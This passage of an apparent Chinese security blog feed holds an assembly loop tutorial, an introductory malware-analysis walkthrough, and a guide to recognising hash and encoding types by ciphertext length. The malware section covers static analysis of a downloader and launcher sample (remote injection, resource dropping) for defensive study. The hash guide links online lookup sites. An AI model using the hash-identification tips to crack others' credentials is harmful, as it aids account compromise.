punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	inc eax<span class="token punctuation">;</span>inc相当于C语言中的 <span class="token operator">++</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	jmp lp</pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><p>可以看到此时在 inc eax 处是已完成清零操作的</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124203652098.png" alt="image-20220124203652098" /></p>
<p>再在 jmp 处进行调试可以发现此时 eax = 1 了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124203834706.png" alt="image-20220124203834706" /></p>
<p>此时再在 <code>jmp</code>  处进行调试可以发现自动跳转到 <code>lp</code>  那对 <code>inc eax</code>  进行执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124204028019.png" alt="image-20220124204028019" /></p>
<p>再进行一次测试可以发现 eax = 2 了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124204218892.png" alt="image-20220124204218892" /></p>
<p>不难发现 jmp 对其后的标号进行跳转，且无条件跳转</p>
<h2 id="loop学习"><a class="anchor" href="#loop学习">#</a> LOOP 学习</h2>
<p>相比于上面 <code>jmp</code>  的死循环， <code>loop</code>  的循环次数更为可控</p>
<p><strong>测试代码</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token number">10</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	inc eax<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p>给 <code>ecx</code>  赋值为 <code>10</code> ，可以看到在第一次测试的时候可以看到 <code>ecx = A</code> ，即 <code>ecx = 10</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124204941844.png" alt="image-20220124204941844" /></p>
<p>对 <code>eac</code>  进行测试可以看到 <code>eax</code>  经过一次执行后变成了  <code>1</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124205017287.png" alt="image-20220124205017287" /></p>
<p>执行一次 <code>loop，</code> 可以看到 <code>ecx = 9</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124205133133.png" alt="image-20220124205133133" /></p>
<p>再次调试可以发现 <code>eax = 2</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124205208818.png" alt="image-20220124205208818" /></p>
<p>而 <code>ecx</code>  变成了 <code>8</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124205243935.png" alt="image-20220124205243935" /></p>
<p>通过上面的测试可以发现：每执行一次循环 <code>ecx - 1</code></p>
<p>这里 <code>loop</code>  指令的作用便是一直重复执行 <code>inc eax</code></p>
<h2 id="利用loop进行字符串拷贝"><a class="anchor" href="#利用loop进行字符串拷贝">#</a> 利用 loop 进行字符串拷贝</h2>
<h3 id="测试样例"><a class="anchor" href="#测试样例">#</a> 测试样例</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>source byte <span class="token string">"My name is 21r000"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>源字符串</pre></td></tr><tr><td data-num="16"></td><td><pre>target byte <span class="token keyword">sizeof</span> source <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>目的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">;</span>利用<span class="token keyword">sizeof</span>伪指令计算源字符串大小</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token keyword">sizeof</span> source<span class="token punctuation">;</span>计算有效元素个数</pre></td></tr><tr><td data-num="24"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	mov al<span class="token punctuation">,</span>source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">;</span>获取第esi个字符</pre></td></tr><tr><td data-num="26"></td><td><pre>	mov target<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">,</span>al<span class="token punctuation">;</span>将源字符串存入目标字符串</pre></td></tr><tr><td data-num="27"></td><td><pre>	inc esi<span class="token punctuation">;</span><span class="token operator">++</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	loop lp<span class="token punctuation">;</span>执行循环</pre></td></tr><tr><td data-num="29"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>可以看到 <code>mov ecx,sizeof source</code>  计算了有效元素个数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124210911818.png" alt="image-20220124210911818" /></p>
<p>取地址查看 <code>&amp;target</code> ，可以发现目标字符串已完成拷贝。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124211120794.png" alt="image-20220124211120794" /></p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意代码浅析</title>
    <url>/article/c7508042.html</url>
    <content><![CDATA[<h1 id="基础知识"><a class="anchor" href="#基础知识">#</a> 基础知识</h1>
<h2 id="目的"><a class="anchor" href="#目的">#</a> 目的</h2>
<ul>
<li>特征码</li>
<li>分析报告</li>
<li>专杀工具</li>
</ul>
<h2 id="方法"><a class="anchor" href="#方法">#</a> 方法</h2>
<h3 id="简要分析"><a class="anchor" href="#简要分析">#</a> 简要分析</h3>
<ul>
<li>快速分析技术</li>
<li>日志分析技术</li>
</ul>
<h4 id="作用"><a class="anchor" href="#作用">#</a> 作用</h4>
<ul>
<li>提取特征码</li>
<li>简要报告</li>
</ul>
<h3 id="详细分析"><a class="anchor" href="#详细分析">#</a> 详细分析</h3>
<ul>
<li>静态分析</li>
<li>动态分析</li>
</ul>
<h4 id="作用-2"><a class="anchor" href="#作用-2">#</a> 作用</h4>
<ul>
<li>提取特征码</li>
<li>详细分析报告</li>
<li>专杀工具开发</li>
<li>获取 C2</li>
<li>...</li>
</ul>
<h2 id="类型"><a class="anchor" href="#类型">#</a> 类型</h2>
<ul>
<li>后门</li>
<li>僵尸网络</li>
<li>下载器</li>
<li>间谍软件</li>
<li>启动器</li>
<li>内核套件</li>
<li>勒索软件</li>
<li>蠕虫</li>
</ul>
<h1 id="恶意代码分析"><a class="anchor" href="#恶意代码分析">#</a> 恶意代码分析</h1>
<h2 id="静态分析"><a class="anchor" href="#静态分析">#</a> 静态分析</h2>
<ol>
<li>
<p>在线反病毒引擎</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudmlyc2Nhbi5vcmcv">VirScan</span> 病毒引擎较少且更新较慢</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405194048053.png" alt="image-20220405194048053" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20v">VirusTotal</span> 较为常用</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405194233207.png" alt="image-20220405194233207" /></p>
<p>上传恶意文件即可解析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405194646588.png" alt="image-20220405194646588" /></p>
</li>
<li>
<p>获取哈希值 (certutil -hashfile path MD5)</p>
</li>
</ol>
<p>在命令窗口执行命令即可获取 md5</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405195136982.png" alt="image-20220405195136982" /></p>
<ol start="3">
<li>查找字符串
<ul>
<li>hive</li>
<li>string</li>
<li>ida</li>
<li>火热剑</li>
</ul>
</li>
</ol>
<p>将软件在 ida 中打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405195509326.png" alt="image-20220405195509326" /></p>
<p>点击如下即可查看字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405195634065.png" alt="image-20220405195634065" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405195651258.png" alt="image-20220405195651258" /></p>
<p>找到含有 system32 路径的字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405195728936.png" alt="image-20220405195728936" /></p>
<p>跟进然后 ctrl + s 引用</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405195852253.png" alt="image-20220405195852253" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405195950703.png" alt="image-20220405195950703" /></p>
<ol start="3">
<li>查壳</li>
</ol>
<p>使用 peid 进行查壳</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405200141983.png" alt="image-20220405200141983" /></p>
<ol start="4">
<li>导入导出表</li>
</ol>
<p>lord pe 中进行查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405200307199.png" alt="image-20220405200307199" /></p>
<p>目录查看导入导出表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405200414341.png" alt="image-20220405200414341" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405200439478.png" alt="image-20220405200439478" /></p>
<p>据此判断大致功能</p>
<p><strong>动态寻址</strong></p>
<ul>
<li>获取函数地址</li>
<li>加载动态链接库</li>
</ul>
<p><strong>执行程序</strong></p>
<ul>
<li>WinExec</li>
</ul>
<p><strong>移动自身，进行隐藏</strong></p>
<ul>
<li>创建文件</li>
<li>写文件</li>
<li>移动文件</li>
</ul>
<p><strong>远程注入</strong></p>
<ul>
<li>打开进程</li>
<li>创建远程线程</li>
</ul>
<p><strong>资源段含有隐藏内容，释放可执行文件</strong></p>
<ul>
<li>寻找资源</li>
<li>资源尺寸</li>
<li>加载资源</li>
</ul>
<p><strong>进行权限相关的操作</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405201225299.png" alt="image-20220405201225299" /></p>
<p>据此判断是否为<strong>提权</strong></p>
<p>结合以上信息可以判断出，测试程序为<strong>下载器</strong>和<strong>启动器</strong>，<strong>无实际恶意功能</strong></p>
<ol start="5">
<li>获取资源信息</li>
</ol>
<p>lord pe 目录表中即可查看资源信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405201447060.png" alt="image-20220405201447060" /></p>
<p>跟进查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405201525526.png" alt="image-20220405201525526" /></p>
<p><strong>4D 5A</strong>：Dos 头</p>
<p>结合 pe 头可以判断是否为 windows 下可执行程序（PE 程序）</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405201606748.png" alt="image-20220405201606748" /></p>
<p>点击保存即可导出资源信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405201754172.png" alt="image-20220405201754172" /></p>
<p>然后用 lord pe 加载导出的资源文件，即可查看内容</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405201842317.png" alt="image-20220405201842317" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405201920478.png" alt="image-20220405201920478" /></p>
<p>据此可以判断测试程序起：<strong>释放文件 + 启动器</strong>的功能</p>
<p>而资源表文件则为：<strong>下载文件 + 执行</strong>，即下载器</p>
<p>在 ida 中对资源文件进行解析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405202154860.png" alt="image-20220405202154860" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405202227484.png" alt="image-20220405202227484" /></p>
<p>跟进查看字符串信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405202248892.png" alt="image-20220405202248892" /></p>
<ol start="5">
<li>在线沙箱 -<span class="exturl" data-url="aHR0cHM6Ly9zLnRocmVhdGJvb2suY24v"> 微步云沙箱</span></li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405202453552.png" alt="image-20220405202453552" /></p>
<p>即可查看详细报告</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405202559003.png" alt="image-20220405202559003" /></p>
<h2 id="动态分析"><a class="anchor" href="#动态分析">#</a> 动态分析</h2>
<ul>
<li>火绒剑分析</li>
<li>rundll32：分析动态链接库</li>
<li>net start IPRIP：以服务方式启动</li>
<li>WireShark：监控网络状态，分析网络特征</li>
<li>strings.exe：提取字符串</li>
</ul>
<p>通过以上方法实现不同方面的动态分析，挖坑，回来再补 &lt;(￣︶￣)↗[GO!]</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/EA1D0C59A23AAB1580B164CCABEA0EC0.gif" alt="img-EA1D0C59A23AAB1580B164CCABEA0EC0" /></p>
]]></content>
      <categories>
        <category>恶意代码浅析</category>
      </categories>
      <tags>
        <tag>恶意代码浅析</tag>
      </tags>
  </entry>
  <entry>
    <title>加密编码类型的密文特征分析</title>
    <url>/article/85e79b6c.html</url>
    <content><![CDATA[<h2 id="md5-sha1-hmac算法-ntlm等相似加密类型"><a class="anchor" href="#md5-sha1-hmac算法-ntlm等相似加密类型">#</a> MD5、sha1、HMAC 算法、NTLM 等相似加密类型</h2>
<ol>
<li>MD5—— 示例 <code>admin</code></li>
</ol>
<p><strong>一般 MD5 值是 32 位由数字 “0-9” 和字母 “a-f” 所组成的字符串</strong>，如果出现这个范围以外的字符说明这可能是个</p>
<p>错误的 md5 值，就没必要再拿去解密了。</p>
<p>MD5 加密后的位数一般为两种，16 位与 32 位。16 位实际上是从 32 位字符串中，取中间的第 9 位到第 24</p>
<p>位的部分。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329170456668.png" alt="image-20220329170456668" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329170514429.png" alt="image-20220329170514429" /></p>
<p><strong>md5 的三个特征：</strong></p>
<ul>
<li><strong>确定性</strong>：一个原始数据的 MD5 值是唯一的，同一个原始数据不可能会计算出多个不同的 MD5 值。</li>
<li><strong>碰撞性</strong>：原始数据与其 MD5 值并不是一一对应的，有可能多个原始数据计算出来的 MD5 值是一样的，这就是碰撞。</li>
<li><strong>不可逆</strong>：也就是说如果告诉你一个 MD5 值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第 4 点，一个给定的 MD5 值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。</li>
</ul>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly90b29sLmNoaW5hei5jb20vdG9vbHMvbWQ1LmFzcHg=">https://tool.chinaz.com/tools/md5.aspx</span></p>
<ol start="2">
<li>sha1—— 示例 <code>admin</code> <br />
 这种加密的密文特征跟 MD5 差不多，只不过位数是 40</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329170956676.png" alt="image-20220329170956676" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy50dG1kNS5jb20vaGFzaC5waHA/dHlwZT01">http://www.ttmd5.com/hash.php?type=5</span></p>
<ol start="3">
<li>
<p>HMAC 算法 —— 示例 <code>admin</code> <br />
HMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基</p>
<p>础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的</p>
</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329171137897.png" alt="image-20220329171137897" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly90b29sLm9zY2hpbmEubmV0L2VuY3J5cHQ/dHlwZT0y">https://tool.oschina.net/encrypt?type=2</span></p>
<ol start="3">
<li>NTLM—— 示例 <code>admin</code> <br />
 这种加密是 Windows 的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有 Domain Cached Credentials（域哈希）。</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329171325351.png" alt="image-20220329171325351" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5hYjEyNi5jb20vZ29qdS8xMDg3NC5odG1s">http://www.ab126.com/goju/10874.html</span></p>
<h3 id="相似加密类型"><a class="anchor" href="#相似加密类型">#</a> 相似加密类型</h3>
<table>
<thead>
<tr>
<th style="text-align:center">#</th>
<th style="text-align:center">算法</th>
<th style="text-align:center">长度</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">md5</td>
<td style="text-align:center">32/16</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">sha1</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">sha256</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">sha512</td>
<td style="text-align:center">128</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">adler32</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">crc32</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">crc32b</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">fnv132</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">fnv164</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">fnv1a32</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">fnv1a64</td>
<td style="text-align:center">16</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">gost</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">gost-crypto</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">haval128,3</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">haval128,4</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:center">haval128,5</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td style="text-align:center">haval160,3</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td style="text-align:center">haval160,4</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td style="text-align:center">haval160,5</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td style="text-align:center">haval192,3</td>
<td style="text-align:center">48</td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td style="text-align:center">haval192,4</td>
<td style="text-align:center">48</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td style="text-align:center">haval192,5</td>
<td style="text-align:center">48</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td style="text-align:center">haval224,3</td>
<td style="text-align:center">56</td>
</tr>
<tr>
<td style="text-align:center">24</td>
<td style="text-align:center">haval224,4</td>
<td style="text-align:center">56</td>
</tr>
<tr>
<td style="text-align:center">25</td>
<td style="text-align:center">haval224,5</td>
<td style="text-align:center">56</td>
</tr>
<tr>
<td style="text-align:center">26</td>
<td style="text-align:center">haval256,3</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">27</td>
<td style="text-align:center">haval256,4</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">28</td>
<td style="text-align:center">haval256,5</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">29</td>
<td style="text-align:center">joaat</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">30</td>
<td style="text-align:center">md2</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">31</td>
<td style="text-align:center">md4</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">32</td>
<td style="text-align:center">ripemd128</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">33</td>
<td style="text-align:center">ripemd160</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">34</td>
<td style="text-align:center">ripemd256</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">35</td>
<td style="text-align:center">ripemd320</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">36</td>
<td style="text-align:center">sha224</td>
<td style="text-align:center">56</td>
</tr>
<tr>
<td style="text-align:center">37</td>
<td style="text-align:center">sha3-224</td>
<td style="text-align:center">56</td>
</tr>
<tr>
<td style="text-align:center">38</td>
<td style="text-align:center">sha3-256</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">39</td>
<td style="text-align:center">sha3-384</td>
<td style="text-align:center">96</td>
</tr>
<tr>
<td style="text-align:center">40</td>
<td style="text-align:center">sha3-512</td>
<td style="text-align:center">128</td>
</tr>
<tr>
<td style="text-align:center">41</td>
<td style="text-align:center">sha384</td>
<td style="text-align:center">96</td>
</tr>
<tr>
<td style="text-align:center">42</td>
<td style="text-align:center">sha512/224</td>
<td style="text-align:center">56</td>
</tr>
<tr>
<td style="text-align:center">43</td>
<td style="text-align:center">sha512/256</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">44</td>
<td style="text-align:center">snefru</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">45</td>
<td style="text-align:center">snefru256</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">46</td>
<td style="text-align:center">tiger128,3</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">47</td>
<td style="text-align:center">tiger128,4</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">48</td>
<td style="text-align:center">tiger160,3</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">49</td>
<td style="text-align:center">tiger160,4</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">50</td>
<td style="text-align:center">tiger192,3</td>
<td style="text-align:center">48</td>
</tr>
<tr>
<td style="text-align:center">51</td>
<td style="text-align:center">tiger192,4</td>
<td style="text-align:center">48</td>
</tr>
<tr>
<td style="text-align:center">52</td>
<td style="text-align:center">whirlpool</td>
<td style="text-align:center">128</td>
</tr>
<tr>
<td style="text-align:center">53</td>
<td style="text-align:center">mysql</td>
<td style="text-align:center">老 MYSQL 数据库用的，16 位，且第 1 位和第 7 位必须为 0-8</td>
</tr>
<tr>
<td style="text-align:center">54</td>
<td style="text-align:center">mysql5</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">55</td>
<td style="text-align:center">NTLM</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">56</td>
<td style="text-align:center">Domain Cached Credentials</td>
<td style="text-align:center">32</td>
</tr>
</tbody>
</table>
<h2 id="base64-base58-base32-base16-base85-base100等相似加密类型"><a class="anchor" href="#base64-base58-base32-base16-base85-base100等相似加密类型">#</a> Base64、Base58、Base32、Base16、Base85、Base100 等相似加密类型</h2>
<ol>
<li>Base64—— 示例 <code>admin</code> <br />
 一般情况下密文尾部都会有两个等号，明文很少的时候则没有</li>
</ol>
<p>Base64 编码要求把 3 个 8 位字节（38=24）转化为 4 个 6 位的字节（46=24），之后在 6 位的前面补两个 0，形成 8</p>
<p>位一个字节的形式。如果剩下的字符不足 3 个字节，则用 0 填充，输出字符使用‘=’，因此编码后输出的文本</p>
<p>末尾可能会出现 1 或 2 个‘=’。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329172725517.png" alt="image-20220329172725517" /></p>
